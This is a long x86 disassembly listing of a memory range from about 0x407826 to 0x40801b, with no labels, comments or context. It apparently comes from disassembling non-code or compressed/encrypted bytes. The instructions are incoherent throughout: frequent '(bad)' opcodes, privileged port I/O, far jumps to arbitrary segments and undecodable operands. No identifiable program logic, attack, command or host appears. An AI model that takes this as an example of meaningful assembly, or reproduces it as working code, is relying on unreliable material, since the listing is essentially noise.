  407826:	stos   DWORD PTR es:[edi],eax
  407827:	and    edx,DWORD PTR [eax+0x57]
  40782a:	or     al,BYTE PTR [ebp-0x61]
  40782d:	dec    edx
  40782e:	das    
  40782f:	fild   WORD PTR [ebx+0x6b982c15]
  407835:	push   edi
  407836:	mov    eax,0xb31802c7
  40783b:	mov    eax,0x2123ca7a
  407840:	je     0x40782e
  407842:	push   esp
  407843:	jb     0x40783a
  407845:	xor    esi,DWORD PTR [edi]
  407847:	out    0x38,eax
  407849:	and    al,0x17
  40784b:	xchg   esi,eax
  40784c:	sbb    cl,BYTE PTR [esi+0x76e2edae]
  407852:	(bad)  
  407853:	aad    0x31
  407855:	or     ch,BYTE PTR [esi]
  407857:	xchg   edx,eax
  407858:	stc    
  407859:	sub    BYTE PTR [esi-0x3db7f0bd],bl
  40785f:	imul   esp,eax,0x6a7b4063
  407865:	ss daa 
  407867:	add    ch,BYTE PTR [ebp+0x3]
  40786a:	out    dx,al
  40786b:	inc    esi
  40786c:	cmp    ch,BYTE PTR [edi]
  40786e:	mov    edi,0x7827378c
  407873:	adc    dh,BYTE PTR [ecx+0xd]
  407876:	and    DWORD PTR [ebx],esp
  407878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407879:	scas   al,BYTE PTR es:[edi]
  40787a:	sbb    ebx,DWORD PTR [edx-0x49]
  40787d:	(bad)  
  40787e:	aaa    
  40787f:	add    DWORD PTR [eax],ebx
  407881:	mov    bh,0x0
  407883:	sub    edi,ebp
  407885:	jmp    0xb446:0x7acfd5c1
  40788c:	inc    esi
  40788d:	stc    
  40788e:	imul   eax,DWORD PTR [edi],0x1072a21e
  407894:	cmp    al,0xe1
  407896:	pusha  
  407897:	pop    ecx
  407898:	imul   edi,DWORD PTR [eax],0x47c2f92c
  40789e:	ror    esi,0x6f
  4078a1:	push   ecx
  4078a2:	xchg   DWORD PTR [ebx],ebp
  4078a4:	lock rol BYTE PTR [edi-0x4c4455b8],1
  4078ab:	test   BYTE PTR [ebx-0x1b],bh
  4078ae:	rol    BYTE PTR [ecx+0x214880a3],1
  4078b4:	mov    BYTE PTR [ecx],ah
  4078b6:	mov    ch,0x20
  4078b8:	inc    eax
  4078b9:	mov    eax,ds:0xf93ed91
  4078be:	loopne 0x40786c
  4078c0:	rcr    BYTE PTR [esi-0x4c],0x33
  4078c4:	cmp    eax,0xaba22685
  4078c9:	push   edx
  4078ca:	shl    BYTE PTR [ecx-0x1d0b910],cl
  4078d0:	push   ss
  4078d1:	jne    0x4078d4
  4078d3:	mov    ebp,0x593a1e0e
  4078d8:	int    0xeb
  4078da:	outs   dx,DWORD PTR ds:[esi]
  4078db:	pushf  
  4078dc:	dec    ecx
  4078dd:	jae    0x4078aa
  4078df:	loope  0x407909
  4078e1:	mov    esi,0x298b9fa6
  4078e6:	(bad)  
  4078e7:	out    dx,eax
  4078e8:	lock mov dh,0xc6
  4078ec:	enter  0x8d64,0xad
  4078f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078f1:	pop    ecx
  4078f2:	(bad)  
  4078f4:	sti    
  4078f5:	lahf   
  4078f6:	retf   
  4078f7:	mov    ebx,0x31ed3506
  4078fc:	pop    ebx
  4078fd:	or     DWORD PTR [ebp+0x191d0808],ecx
  407903:	jg     0x407977
  407905:	mov    bl,0x6a
  407907:	dec    edi
  407908:	mov    BYTE PTR [eax+0x16],dl
  40790b:	fisttp WORD PTR [esi]
  40790d:	mov    ds:0xe3d828a4,al
  407912:	popa   
  407913:	ds pop edx
  407915:	mov    eax,ebx
  407917:	xchg   edx,eax
  407918:	xchg   ecx,eax
  407919:	ja     0x4078dc
  40791b:	pop    edi
  40791c:	fsub   st,st(7)
  40791e:	cmp    ecx,DWORD PTR [edx]
  407920:	adc    DWORD PTR [edi-0x5850040d],0xffffffac
  407927:	push   eax
  407928:	mov    ebp,0xbfbe5168
  40792d:	add    esi,ebp
  40792f:	or     cl,al
  407931:	pushf  
  407932:	sbb    DWORD PTR [eax],ebp
  407934:	mov    dl,0x9c
  407936:	repz sar BYTE PTR [ebx-0x131e1bb2],0x55
  40793e:	inc    edx
  40793f:	cmp    al,0xfb
  407941:	test   DWORD PTR ss:[eax],ebx
  407944:	pop    eax
  407945:	cmp    al,0xf6
  407947:	mov    dl,BYTE PTR [ebp+0x5e]
  40794a:	cld    
  40794b:	jge    0x4078ee
  40794d:	pop    esi
  40794e:	mov    edi,0xc41944b9
  407953:	xor    eax,DWORD PTR [esi-0x3d]
  407956:	out    dx,al
  407957:	int3   
  407958:	arpl   WORD PTR [edx+0x36fc91bb],ax
  40795e:	(bad)  
  40795f:	pop    ss
  407960:	mov    esp,0x6aaa6b7b
  407965:	aam    0xd3
  407967:	jns    0x407991
  407969:	fwait
  40796a:	pop    edi
  40796b:	addr16 imul ecx,ebx,0x3f
  40796f:	sbb    cl,dl
  407971:	mov    ebx,DWORD PTR [edx]
  407973:	test   BYTE PTR [esi+ebx*1-0x6f],0x85
  407978:	in     eax,0x21
  40797a:	dec    edx
  40797b:	nop
  40797c:	jge    0x407948
  40797e:	sub    ebx,DWORD PTR [edx+edx*2+0x2479a33e]
  407985:	fwait
  407986:	(bad)  
  407987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407988:	fstp   DWORD PTR [ecx+0x60f950ee]
  40798e:	pop    esi
  40798f:	mov    BYTE PTR [ebp+0x2e],0x57
  407993:	add    BYTE PTR [esi+0x27],dl
  407996:	mov    ds:0xa6c12fd,al
  40799b:	jl     0x4079fe
  40799d:	sub    al,0x6d
  40799f:	push   ss
  4079a0:	jae    0x407a1a
  4079a2:	fbld   TBYTE PTR [esi]
  4079a4:	inc    esp
  4079a5:	jmp    0x335f3485
  4079aa:	push   0x8fd4b36
  4079af:	and    bl,dh
  4079b1:	jbe    0x4079ea
  4079b3:	clc    
  4079b4:	loop   0x407952
  4079b6:	daa    
  4079b7:	mov    ss,WORD PTR [edx]
  4079b9:	cmp    al,BYTE PTR [ecx]
  4079bb:	pop    ss
  4079bc:	pop    ds
  4079bd:	(bad)  
  4079bf:	pop    ss
  4079c0:	push   esp
  4079c1:	fisttp QWORD PTR [esi-0x47]
  4079c4:	inc    esp
  4079c5:	mov    eax,ds:0xc1840bd0
  4079ca:	sbb    eax,0xe3507ae4
  4079cf:	mov    ds:0x75aee020,al
  4079d4:	clc    
  4079d5:	repnz ds sar ebp,0xbb
  4079da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079db:	imul   ebp,DWORD PTR [edi+0x38c1a6b6],0xffffff8a
  4079e2:	dec    ebx
  4079e3:	test   DWORD PTR [eax],esp
  4079e5:	lock mov al,0xcc
  4079e8:	cmp    ah,dl
  4079ea:	and    DWORD PTR [esi],ebx
  4079ec:	add    BYTE PTR [esi],bh
  4079ee:	xor    ebx,esi
  4079f0:	push   edx
  4079f1:	push   edx
  4079f2:	jb     0x407a6a
  4079f4:	jge    0x407a4c
  4079f6:	lea    esi,[ebx-0x5b389b5a]
  4079fc:	stc    
  4079fd:	or     BYTE PTR [edx-0x2f244b6b],al
  407a03:	popa   
  407a04:	add    eax,0xc587583f
  407a09:	add    bh,bh
  407a0b:	adc    bh,BYTE PTR [edi+eax*4]
  407a0e:	push   edx
  407a0f:	sbb    cl,BYTE PTR [edx+0x7bd1afdf]
  407a15:	adc    edx,DWORD PTR [esi]
  407a17:	sub    esi,DWORD PTR ds:0xbc78e5c
  407a1d:	lahf   
  407a1e:	sbb    al,0xee
  407a20:	jge    0x407a62
  407a22:	mov    dh,BYTE PTR [edi+ebx*1]
  407a25:	les    ecx,FWORD PTR [eax+0x1413f1cb]
  407a2b:	mov    DWORD PTR [ecx-0x3706fca5],ecx
  407a31:	into   
  407a32:	jl     0x4079ec
  407a34:	ds adc eax,0x214390f9
  407a3a:	ja     0x407a24
  407a3c:	xor    eax,0x136df4b1
  407a41:	(bad)  
  407a42:	sbb    al,0x72
  407a44:	cmovae ebp,DWORD PTR [ecx-0x48]
  407a48:	sbb    al,0x8
  407a4a:	cli    
  407a4b:	add    DWORD PTR [edi-0x41],ebx
  407a4e:	(bad)  
  407a4f:	aas    
  407a50:	pop    edx
  407a51:	push   edx
  407a52:	inc    edx
  407a53:	add    dh,BYTE PTR [edi+eax*8]
  407a56:	mov    ah,0x46
  407a58:	xor    bh,bh
  407a5a:	out    dx,al
  407a5b:	cdq    
  407a5c:	lds    edx,FWORD PTR [edi-0x7957491d]
  407a62:	ret    0xcefb
  407a65:	jns    0x407a94
  407a67:	or     DWORD PTR [bx-0x44],esp
  407a6b:	imul   esi,DWORD PTR [esi+0xaf74148],0xffffffcd
  407a72:	push   esp
  407a73:	popf   
  407a74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a75:	sbb    BYTE PTR [ecx],al
  407a77:	popf   
  407a78:	icebp  
  407a79:	sbb    DWORD PTR [edi+eax*1-0x44],esp
  407a7d:	mov    BYTE PTR [ecx],ch
  407a7f:	push   ds
  407a80:	jns    0x407ae4
  407a82:	es pop ds
  407a84:	inc    edi
  407a85:	xchg   ebp,eax
  407a86:	rcl    BYTE PTR [esi+0x24ed52d4],cl
  407a8c:	jmp    0x413791de
  407a91:	rep lods al,BYTE PTR ds:[esi]
  407a93:	repnz clc 
  407a95:	std    
  407a96:	adc    edx,ebp
  407a98:	and    al,0x52
  407a9a:	inc    ecx
  407a9b:	lahf   
  407a9c:	inc    edi
  407a9d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  407a9f:	jae    0x407a9c
  407aa1:	inc    edx
  407aa2:	sbb    esp,esp
  407aa4:	aad    0xa8
  407aa6:	push   edi
  407aa7:	pop    esi
  407aa8:	and    eax,0xd70b059a
  407aad:	push   edi
  407aae:	jecxz  0x407b02
  407ab0:	bound  esi,QWORD PTR [edx+0x45]
  407ab3:	bound  eax,QWORD PTR [edi+0x3]
  407ab6:	xchg   ecx,eax
  407ab7:	leave  
  407ab8:	fistp  WORD PTR [ebp+0x78885c99]
  407abe:	call   0xed4b:0xb86619e8
  407ac5:	mov    ecx,0x6d81ff5f
  407aca:	pop    ecx
  407acb:	jnp    0x407b18
  407acd:	(bad)  
  407ace:	in     eax,dx
  407acf:	jae    0x407b4c
  407ad1:	es pop esp
  407ad3:	add    DWORD PTR [esi+ecx*4+0xe],ecx
  407ad7:	jmp    0x407a92
  407ad9:	mov    DWORD PTR [ebx],0xe0eeff25
  407adf:	call   0x37f1bdf
  407ae4:	(bad)  
  407ae5:	pop    esp
  407ae6:	rcpps  xmm1,XMMWORD PTR [ecx+ecx*8+0x3335ab6]
  407aee:	mov    cl,bh
  407af0:	jg     0x407adc
  407af2:	fiadd  WORD PTR [esi+eax*2]
  407af5:	retf   
  407af6:	retf   
  407af7:	leave  
  407af8:	imul   ecx,DWORD PTR [edi+0x31],0x2a
  407afc:	mov    cl,BYTE PTR [edx+0x59]
  407aff:	pop    esp
  407b00:	shr    BYTE PTR [esi],1
  407b02:	fwait
  407b03:	and    al,0xc9
  407b05:	adc    BYTE PTR [ebx-0x7],al
  407b08:	sub    ch,BYTE PTR [esi+0x3e352334]
  407b0e:	loop   0x407b4b
  407b10:	mov    al,0xa4
  407b12:	das    
  407b13:	daa    
  407b14:	mov    edx,0x139e29d5
  407b19:	or     ebp,edi
  407b1b:	es aam 0x3c
  407b1e:	sbb    edi,DWORD PTR [esp+eax*8+0x419d1822]
  407b25:	fwait
  407b26:	xchg   esp,eax
  407b27:	xor    eax,0x6d5e59e6
  407b2c:	int3   
  407b2d:	repz sub DWORD PTR [eax],esi
  407b30:	mov    esi,0x9ea62ac
  407b35:	ret    
  407b36:	arpl   WORD PTR ds:0x8e0caa46,sp
  407b3c:	adc    ecx,0xe3df8f75
  407b42:	std    
  407b43:	add    eax,0xc3a49d29
  407b48:	lods   eax,DWORD PTR ds:[esi]
  407b49:	add    DWORD PTR [ebp-0x7ec3072f],0xffffffb4
  407b50:	and    esi,DWORD PTR [eax]
  407b52:	(bad)  
  407b53:	jmp    0xf4b4:0x4534246c
  407b5a:	sub    BYTE PTR [ecx+0x71],bl
  407b5d:	xchg   ebx,eax
  407b5e:	xchg   esi,eax
  407b5f:	push   0xffffffee
  407b61:	fstp   QWORD PTR [ebp-0x70b0d3bb]
  407b67:	jmp    0x20db720f
  407b6c:	xor    ebp,DWORD PTR [ebx+0x2f02b253]
  407b72:	popa   
  407b73:	lock nop
  407b75:	xchg   esi,eax
  407b76:	jo     0x407b1d
  407b78:	mov    esp,0x82cbb40b
  407b7d:	xlat   BYTE PTR es:[ebx]
  407b7f:	or     BYTE PTR [ebx+0x6bc2ac70],0x6a
  407b86:	mov    eax,0x944aac98
  407b8b:	jp     0x407bcf
  407b8d:	cmp    ah,BYTE PTR [edi+0x6]
  407b90:	xchg   DWORD PTR [edi+0x1fd12c18],edi
  407b96:	adc    dl,dl
  407b98:	xor    esp,ebx
  407b9a:	pop    edi
  407b9b:	pop    eax
  407b9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b9d:	rol    BYTE PTR [eax],cl
  407b9f:	scas   eax,DWORD PTR es:[edi]
  407ba0:	pop    ebp
  407ba1:	imul   eax,DWORD PTR [edx+0x887e5d4],0x2e88005e
  407bab:	cmp    al,0x9a
  407bad:	inc    edx
  407bae:	outs   dx,BYTE PTR ds:[esi]
  407baf:	pop    ebx
  407bb0:	nop
  407bb1:	xchg   DWORD PTR ds:[eax],edi
  407bb4:	movntq QWORD PTR [ecx+0x3a],mm1
  407bb8:	and    BYTE PTR [esi+edx*4-0x52],dh
  407bbc:	popa   
  407bbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bbe:	xor    dl,BYTE PTR cs:[ebx+0x413a528]
  407bc5:	push   ss
  407bc6:	xchg   ebp,eax
  407bc7:	retf   
  407bc8:	mov    BYTE PTR [ecx-0x6f7ba2dd],dl
  407bce:	pop    ebx
  407bcf:	rcl    bh,1
  407bd1:	mov    bh,0x1c
  407bd3:	shr    DWORD PTR [edi],1
  407bd5:	xchg   ebx,eax
  407bd6:	sbb    BYTE PTR [edx-0x46fc1a9d],bl
  407bdc:	cmp    BYTE PTR [esi+eiz*8+0x28949b],cl
  407be3:	clc    
  407be4:	int3   
  407be5:	and    al,0xba
  407be7:	xchg   edx,eax
  407be8:	xor    al,BYTE PTR [ebx-0x35]
  407beb:	add    DWORD PTR [edx],edx
  407bed:	out    dx,eax
  407bee:	xor    al,0x67
  407bf0:	xor    BYTE PTR [edi-0x76],bh
  407bf3:	and    BYTE PTR [eax],dh
  407bf5:	xchg   esi,eax
  407bf6:	js     0x407c22
  407bf8:	ror    DWORD PTR cs:[ebp+0xf],cl
  407bfc:	fadd   DWORD PTR [eax-0x42696ae6]
  407c02:	sbb    al,BYTE PTR [edi+esi*8+0x6a966db]
  407c09:	and    DWORD PTR [ebp-0x34],edi
  407c0c:	cmp    DWORD PTR [eax],ebp
  407c0e:	ss dec ebp
  407c10:	test   eax,0x821b3b06
  407c15:	xor    edx,DWORD PTR [ebx]
  407c17:	dec    ebp
  407c18:	push   ebx
  407c19:	outs   dx,BYTE PTR ds:[esi]
  407c1a:	push   cs
  407c1b:	sbb    dh,ch
  407c1d:	(bad)  
  407c1e:	adc    ecx,DWORD PTR [ebx+eax*2-0x3]
  407c22:	adc    DWORD PTR [esi+0xb7195d8],edx
  407c28:	aam    0x52
  407c2a:	push   ecx
  407c2b:	fstp   st(6)
  407c2d:	cmp    eax,0x53e398a5
  407c32:	cmp    bl,BYTE PTR [ecx]
  407c34:	xor    ecx,ecx
  407c36:	cdq    
  407c37:	call   0x6899:0xd96cd2e
  407c3e:	xor    DWORD PTR [ecx-0x2dda607a],ebx
  407c44:	scas   eax,DWORD PTR es:[edi]
  407c45:	lahf   
  407c46:	icebp  
  407c47:	ret    0xabcf
  407c4a:	jecxz  0x407bfe
  407c4c:	adc    DWORD PTR [ecx],0x28
  407c4f:	cmp    DWORD PTR [ebp+0x5e],esp
  407c52:	sbb    BYTE PTR [ebx+0x3d],0xc6
  407c56:	test   eax,0xa51dd4e5
  407c5b:	and    eax,0x379223a1
  407c60:	lahf   
  407c61:	iret   
  407c62:	add    esp,DWORD PTR [edi-0x6ad0d02b]
  407c68:	sub    al,0x1
  407c6a:	adc    al,0xf2
  407c6c:	pushf  
  407c6d:	shl    BYTE PTR [ecx+0x4a],1
  407c70:	pop    edi
  407c71:	jle    0x407bf4
  407c73:	dec    edx
  407c74:	rcl    ah,0xc6
  407c77:	add    eax,0x1aa91119
  407c7c:	inc    ebx
  407c7d:	popf   
  407c7e:	push   cs
  407c7f:	ja     0x407c84
  407c81:	pop    ebx
  407c82:	aam    0x4e
  407c84:	cdq    
  407c85:	test   bl,ch
  407c87:	addr16 (bad) 
  407c89:	cdq    
  407c8a:	sahf   
  407c8b:	popf   
  407c8c:	xchg   esp,eax
  407c8d:	hlt    
  407c8e:	sar    BYTE PTR ds:0xffa1bfb0,0xc9
  407c95:	out    dx,al
  407c96:	das    
  407c97:	addr16 out dx,al
  407c99:	mov    eax,ds:0xe2b272a7
  407c9e:	or     eax,0xe808b90e
  407ca3:	pop    ecx
  407ca4:	leave  
  407ca5:	add    eax,0x995218e2
  407caa:	cdq    
  407cab:	js     0x407c47
  407cad:	aaa    
  407cae:	mov    al,ds:0xf3e55d12
  407cb3:	jae    0x407d32
  407cb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cb6:	push   ss
  407cb7:	xchg   ebx,eax
  407cb9:	dec    edi
  407cba:	sub    edi,eax
  407cbc:	dec    esi
  407cbd:	test   BYTE PTR [esi+0x4cc0752a],dh
  407cc3:	add    eax,0x7e9fa4b6
  407cc8:	wbinvd 
  407cca:	dec    eax
  407ccb:	rcl    BYTE PTR [ecx-0xb],0xbc
  407ccf:	fild   WORD PTR [ecx+0x3bb362ac]
  407cd5:	pop    ebx
  407cd6:	setne  BYTE PTR [esi+esi*4+0x47676f4e]
  407cde:	dec    esp
  407cdf:	sbb    eax,0xbf525e39
  407ce4:	nop
  407ce5:	ss (bad) 
  407ce7:	adc    al,0xba
  407ce9:	xchg   esi,eax
  407cea:	enter  0x18d3,0xd7
  407cee:	inc    ebx
  407cef:	xchg   edx,eax
  407cf0:	add    esi,ebp
  407cf2:	loop   0x407d41
  407cf4:	lods   al,BYTE PTR gs:[esi]
  407cf6:	jle    0x407d44
  407cf8:	call   0x9ae9f5e3
  407cfd:	add    eax,0x930ba7c5
  407d02:	mov    dl,0xd9
  407d04:	sahf   
  407d05:	fwait
  407d06:	enter  0xde72,0xaf
  407d0a:	cmp    esp,DWORD PTR [edi+edi*8+0x17cef95b]
  407d11:	push   ds
  407d12:	xor    DWORD PTR [ebp+eax*1+0x7760f0fe],0xa7015c5c
  407d1d:	sahf   
  407d1e:	and    dl,0xcb
  407d21:	(bad)  
  407d22:	in     eax,0xc6
  407d24:	dec    eax
  407d25:	fsub   DWORD PTR [ebp-0xf]
  407d28:	sbb    eax,DWORD PTR [edx+0x1bd3994]
  407d2e:	enter  0x6ff7,0xe6
  407d32:	mov    ds:0x54383561,eax
  407d37:	jb     0x407cd8
  407d39:	inc    esp
  407d3a:	fcom   DWORD PTR [edi-0x26]
  407d3d:	and    al,0xfb
  407d3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d40:	mov    ebx,0x8594f236
  407d45:	inc    BYTE PTR [edx]
  407d47:	fild   QWORD PTR [ebp+0x77]
  407d4a:	pop    ds
  407d4b:	idiv   dh
  407d4d:	pop    ebp
  407d4e:	ja     0x407d7e
  407d50:	and    BYTE PTR [ecx+0x20afbbeb],bl
  407d56:	loopne 0x407d1e
  407d58:	nop
  407d59:	dec    esi
  407d5a:	sbb    DWORD PTR [ecx-0x34],edx
  407d5d:	jns    0x407cff
  407d5f:	inc    ebx
  407d60:	mov    edx,esi
  407d62:	call   DWORD PTR ds:0xda75aeb9
  407d68:	int3   
  407d69:	sbb    al,0x57
  407d6b:	loopne 0x407dc0
  407d6d:	jmp    0x21941440
  407d72:	and    BYTE PTR [ebx+0x37eeb480],ah
  407d78:	sbb    al,BYTE PTR [ecx+0x5f5de093]
  407d7e:	inc    eax
  407d7f:	mov    ds:0x2d7700cf,al
  407d84:	pop    eax
  407d85:	sub    ebx,eax
  407d87:	push   esi
  407d88:	xchg   BYTE PTR [esi-0x51cb761f],bh
  407d8e:	(bad)  
  407d8f:	pusha  
  407d90:	repz or al,0x73
  407d93:	aaa    
  407d94:	sahf   
  407d95:	call   0x9b2d8571
  407d9a:	int    0x43
  407d9c:	(bad)  
  407d9d:	fld    TBYTE PTR [edi+eiz*4+0x66]
  407da1:	xchg   ebp,eax
  407da2:	fild   WORD PTR [edx+0x438646a0]
  407da8:	sbb    DWORD PTR [eax-0x7a81dae5],ebp
  407dae:	cmp    eax,0x26b22995
  407db3:	out    dx,al
  407db4:	in     al,0xd1
  407db6:	aas    
  407db7:	dec    ecx
  407db8:	sbb    BYTE PTR [edx+eax*1],al
  407dbb:	enter  0x7a36,0xf1
  407dbf:	retf   
  407dc0:	add    al,0x52
  407dc2:	pop    ds
  407dc3:	mov    esp,0x9cae9a89
  407dc8:	xor    al,0xb
  407dca:	mov    BYTE PTR [edi+0x567d944],al
  407dd0:	mov    ebx,0x6b5dabfb
  407dd5:	call   0x596:0x14fb5c80
  407ddc:	lds    esi,FWORD PTR [esi+0x5a]
  407ddf:	int    0x66
  407de1:	dec    eax
  407de2:	or     eax,0xac1d7fe8
  407de7:	or     al,0x57
  407de9:	or     DWORD PTR [ebx+0x5b],0xffffffc8
  407ded:	or     eax,eax
  407def:	add    ch,BYTE PTR gs:[edi+0x22]
  407df3:	jb     0x407e6c
  407df5:	mov    esi,0xb5c45b87
  407dfa:	test   eax,0x70073ef6
  407dff:	push   ss
  407e00:	push   es
  407e01:	outs   dx,DWORD PTR ds:[esi]
  407e02:	jo     0x407e17
  407e04:	in     al,0x12
  407e06:	fcompp 
  407e08:	jno    0x407dc1
  407e0a:	lahf   
  407e0b:	call   0xa56c:0x72d4a5f4
  407e12:	mov    dl,cl
  407e14:	or     dl,BYTE PTR [eax+0x7f]
  407e17:	mov    esp,ds
  407e19:	int    0x61
  407e1b:	fild   DWORD PTR [edi-0x74]
  407e1e:	lahf   
  407e1f:	js     0x407e0d
  407e21:	(bad)  
  407e22:	mov    cx,0x665d
  407e26:	push   esi
  407e27:	mov    bh,0x92
  407e29:	adc    DWORD PTR [eax+0x659db559],ecx
  407e2f:	rcl    BYTE PTR [ecx-0x7de1c46f],0x27
  407e36:	mov    ?,WORD PTR [esi]
  407e38:	pusha  
  407e39:	shrd   DWORD PTR [ecx-0x5dcb5593],eax,cl
  407e40:	fcomp  QWORD PTR [esp+ecx*8+0x17]
  407e44:	or     DWORD PTR [edx+0x16fd2a8f],esp
  407e4a:	mov    ds:0x249f8312,al
  407e4f:	xor    DWORD PTR [eax+0x603c9198],edi
  407e55:	data16 xchg BYTE PTR [edx-0x26],cl
  407e59:	fnsave [edx+0x14]
  407e5c:	mov    ebp,0x820eea51
  407e61:	out    dx,al
  407e62:	mov    cl,0x27
  407e64:	ret    0x505c
  407e67:	jl     0x407e45
  407e69:	xchg   BYTE PTR [edx+0xb3b1697],al
  407e6f:	cmp    eax,0x7b7a7217
  407e74:	ret    
  407e75:	retf   
  407e76:	scas   eax,DWORD PTR es:[edi]
  407e77:	hlt    
  407e78:	jl     0x407e46
  407e7a:	dec    esi
  407e7b:	xchg   esp,eax
  407e7c:	loopne 0x407e42
  407e7e:	xchg   edi,eax
  407e7f:	jnp    0x407ea5
  407e81:	aad    0xc5
  407e83:	xor    ecx,DWORD PTR [ebp-0x61eb0e2c]
  407e89:	enter  0xe945,0xc0
  407e8d:	add    eax,0x12f0914c
  407e92:	cld    
  407e93:	lea    esp,[ecx]
  407e95:	jae    0x407e34
  407e97:	(bad)  
  407e98:	fmul   QWORD PTR [eax]
  407e9a:	scas   eax,DWORD PTR es:[edi]
  407e9b:	push   esi
  407e9c:	iret   
  407e9d:	mov    al,0xcf
  407e9f:	(bad)  
  407ea0:	das    
  407ea1:	inc    eax
  407ea2:	mov    esp,0x13734b0c
  407ea7:	ins    DWORD PTR es:[edi],dx
  407ea8:	xor    eax,0xcc7c8471
  407ead:	fld    TBYTE PTR [edx-0x11275dd1]
  407eb3:	inc    ebx
  407eb4:	ja     0x407f17
  407eb6:	jno    0x407ef6
  407eb8:	je     0x407e45
  407eba:	pop    esi
  407ebb:	je     0x407ee0
  407ebd:	jle    0x407f1a
  407ebf:	adc    al,0xea
  407ec1:	sti    
  407ec2:	jns    0x407ee6
  407ec4:	adc    DWORD PTR [ebp+0x71],esp
  407ec7:	mov    esp,0xf5148d59
  407ecc:	and    al,0x7a
  407ece:	pop    esp
  407ecf:	in     al,0x16
  407ed1:	jb     0x407e6b
  407ed3:	shr    BYTE PTR [ecx+edi*8+0xd],1
  407ed7:	stc    
  407ed8:	mov    ebx,edi
  407eda:	cmp    DWORD PTR [esi-0x5c0c1b4f],edi
  407ee0:	outs   dx,BYTE PTR ds:[esi]
  407ee1:	mov    eax,0xc50fea6e
  407ee6:	mov    WORD PTR [ecx+0x5cf3763d],cs
  407eec:	(bad)  
  407eed:	push   es
  407eee:	inc    esi
  407eef:	or     BYTE PTR [ecx],dh
  407ef1:	cli    
  407ef2:	sub    BYTE PTR [edi+0x50],cl
  407ef5:	add    DWORD PTR [esi+0x55d37fd7],ebx
  407efb:	push   es
  407efc:	int    0x8f
  407efe:	repnz or BYTE PTR [edi-0x41edc653],0xf7
  407f06:	enter  0x5c2e,0xe8
  407f0a:	(bad)  
  407f0b:	dec    esi
  407f0c:	int    0x63
  407f0e:	pop    ecx
  407f0f:	xor    bl,BYTE PTR [esi+ebp*8+0x5342c6f7]
  407f16:	mov    edi,0x4c31c9e5
  407f1b:	fnstsw WORD PTR [ebx-0x61]
  407f1e:	xchg   ecx,eax
  407f1f:	jecxz  0x407ee4
  407f21:	in     eax,0x34
  407f23:	mov    ds:0x802ae945,al
  407f28:	inc    ebx
  407f29:	mov    ecx,0x93457f10
  407f2e:	shl    BYTE PTR [esi-0x42],cl
  407f31:	xor    DWORD PTR [eax],0x288f8100
  407f37:	cmp    esi,ecx
  407f39:	inc    esi
  407f3a:	cmc    
  407f3b:	jge    0x407f4e
  407f3d:	dec    ebx
  407f3e:	popa   
  407f3f:	inc    ebp
  407f40:	fsubr  st,st(0)
  407f42:	outs   dx,DWORD PTR ds:[esi]
  407f43:	test   BYTE PTR ds:0x975245b,0x3f
  407f4a:	mov    ?,WORD PTR [esi+0x5c]
  407f4d:	int    0x94
  407f4f:	cmp    DWORD PTR [ebx+0x69b7392d],ebx
  407f55:	pop    eax
  407f56:	inc    ebp
  407f57:	dec    esp
  407f58:	enter  0xf9ea,0x73
  407f5c:	jne    0x407fbf
  407f5e:	pop    ebp
  407f5f:	inc    esp
  407f60:	leave  
  407f61:	jno    0x407f4a
  407f63:	xchg   esp,eax
  407f64:	imul   sp,WORD PTR [esi+0x10],0x41
  407f69:	mov    ecx,0x6735dfb8
  407f6e:	mov    edx,0xa795555a
  407f73:	addr16 jp 0x407f4d
  407f76:	push   edi
  407f77:	loop   0x407f63
  407f79:	jle    0x407f60
  407f7b:	jp     0x407f39
  407f7d:	jmp    0xa63b:0x1e4b399c
  407f84:	mov    esi,0x96bab05c
  407f89:	jmp    0x21a11fee
  407f8e:	outs   dx,BYTE PTR ds:[esi]
  407f8f:	arpl   WORD PTR [esi+0x39b96649],sp
  407f95:	xchg   ecx,eax
  407f96:	adc    eax,0xd417b34d
  407f9b:	mov    esp,0x2a4a4843
  407fa0:	jge    0x407f70
  407fa2:	xlat   BYTE PTR ds:[ebx]
  407fa3:	xor    DWORD PTR [eax-0x40],esi
  407fa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fa7:	rcl    esp,cl
  407fa9:	ret    
  407faa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fab:	aaa    
  407fac:	sbb    BYTE PTR [edi-0x4d4b9d4a],0x81
  407fb3:	gs std 
  407fb5:	pop    ss
  407fb6:	sti    
  407fb7:	mov    bh,ch
  407fb9:	sbb    esp,eax
  407fbb:	or     al,0x2d
  407fbd:	ins    BYTE PTR es:[edi],dx
  407fbe:	in     eax,0x3d
  407fc0:	stc    
  407fc1:	adc    ebp,DWORD PTR [edx]
  407fc3:	mov    bl,0xf0
  407fc5:	dec    ebp
  407fc6:	cmp    BYTE PTR [edi],al
  407fc8:	inc    edx
  407fc9:	lahf   
  407fca:	out    0x3,al
  407fcc:	add    ch,BYTE PTR [esi+0x3]
  407fcf:	add    ecx,DWORD PTR [edi+0x30]
  407fd2:	cmp    bl,BYTE PTR [edi]
  407fd4:	pop    eax
  407fd5:	repz sub ecx,edi
  407fd8:	inc    eax
  407fd9:	pop    esp
  407fdb:	bound  edx,QWORD PTR [edi]
  407fdd:	or     DWORD PTR es:[edx-0x23fa14af],eax
  407fe4:	dec    ebp
  407fe5:	out    0xd7,eax
  407fe7:	jmp    0x407f76
  407fe9:	call   0x7d89f49
  407fee:	pop    ds
  407fef:	cmc    
  407ff0:	out    0x2b,al
  407ff2:	adc    ch,BYTE PTR [ecx-0x5937014d]
  407ff8:	add    eax,0xac6181ed
  407ffd:	aas    
  407ffe:	sub    DWORD PTR [bx+si-0x5f90],0x8b73be71
  408007:	push   ds
  408008:	mov    ah,0xa8
  40800a:	sub    DWORD PTR [ecx-0x44eb11d8],ecx
  408010:	or     al,0xcd
  408012:	mov    es,edi
  408014:	mov    edx,0x343c6542
  408019:	dec    esi
  40801a:	outs   dx,BYTE PTR ds:[esi]
  40801b:	aaa    
